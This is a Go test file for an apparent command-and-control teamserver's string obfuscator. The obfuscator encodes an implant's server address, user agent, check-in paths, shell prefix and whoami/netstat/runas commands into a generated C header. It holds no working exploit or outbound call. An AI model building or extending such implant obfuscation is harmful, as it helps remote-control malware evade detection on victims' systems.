// teamserver/obfgen/obfgen_test.go
package obfgen_test

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"c2/obfgen"
)

func TestEncodeNarrow_Roundtrip(t *testing.T) {
	cases := []string{"/api/register", "/api/checkin", "whoami", "shell ", "127.0.0.1"}
	for _, plain := range cases {
		enc := obfgen.EncodeNarrow(plain)
		got := obfgen.DecodeNarrow(enc)
		if got != plain {
			t.Errorf("%q: roundtrip gave %q", plain, got)
		}
	}
}

func TestEncodeWide_Roundtrip(t *testing.T) {
	cases := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
		"Content-Type: application/octet-stream",
	}
	for _, plain := range cases {
		enc, wlen := obfgen.EncodeWide(plain)
		got := obfgen.DecodeWide(enc, wlen)
		if got != plain {
			t.Errorf("%q: roundtrip gave %q", plain, got)
		}
	}
}

func TestEncodeNarrow_DifferentHosts(t *testing.T) {
	enc1 := obfgen.EncodeNarrow("127.0.0.1")
	enc2 := obfgen.EncodeNarrow("192.168.1.1")
	if string(enc1) == string(enc2) {
		t.Error("different plaintexts produced identical encodings")
	}
}

func TestGenerate_CreatesFile(t *testing.T) {
	dir := t.TempDir()
	if err := obfgen.Generate("10.0.0.1", dir); err != nil {
		t.Fatalf("Generate: %v", err)
	}
	if _, err := os.Stat(filepath.Join(dir, "obf_strings.h")); err != nil {
		t.Fatal("obf_strings.h not created")
	}
}

func TestGenerate_ContainsAllNames(t *testing.T) {
	dir := t.TempDir()
	if err := obfgen.Generate("10.0.0.1", dir); err != nil {
		t.Fatalf("Generate: %v", err)
	}
	data, err := os.ReadFile(filepath.Join(dir, "obf_strings.h"))
	if err != nil {
		t.Fatalf("ReadFile: %v", err)
	}
	content := string(data)
	for _, name := range []string{
		"ENC_SERVER_HOST", "ENC_USER_AGENT", "ENC_PATH_PUBKEY",
		"ENC_PATH_REGISTER", "ENC_PATH_CHECKIN", "ENC_PATH_RESULT",
		"ENC_CONTENT_TYPE", "ENC_SHELL_PREFIX",
		"ENC_CMD_WHOAMI", "ENC_CMD_NETSTAT", "ENC_CMD_RUNAS",
	} {
		if !strings.Contains(content, name) {
			t.Errorf("missing %s", name)
		}
	}
}

func TestGenerate_ServerHostSubstituted(t *testing.T) {
	dir := t.TempDir()
	if err := obfgen.Generate("192.168.1.99", dir); err != nil {
		t.Fatalf("Generate: %v", err)
	}
	data, err := os.ReadFile(filepath.Join(dir, "obf_strings.h"))
	if err != nil {
		t.Fatalf("ReadFile: %v", err)
	}
	if !strings.Contains(string(data), `"192.168.1.99"`) {
		t.Error("server host not in generated comment")
	}
}

func TestGenerate_Roundtrip_PathRegister(t *testing.T) {
	dir := t.TempDir()
	if err := obfgen.Generate("10.0.0.1", dir); err != nil {
		t.Fatalf("Generate: %v", err)
	}
	enc := obfgen.EncodeNarrow("/api/register")
	data, err := os.ReadFile(filepath.Join(dir, "obf_strings.h"))
	if err != nil {
		t.Fatalf("ReadFile: %v", err)
	}
	var hex strings.Builder
	for i, b := range enc {
		if i > 0 {
			hex.WriteByte(',')
		}
		hex.WriteString(fmt.Sprintf(" 0x%02X", b))
	}
	if !strings.Contains(string(data), hex.String()) {
		t.Error("PATH_REGISTER encoding not found in generated header")
	}
}

func TestGenerate_EmptyHostReturnsError(t *testing.T) {
	dir := t.TempDir()
	if err := obfgen.Generate("", dir); err == nil {
		t.Error("Generate with empty host should return error")
	}
}
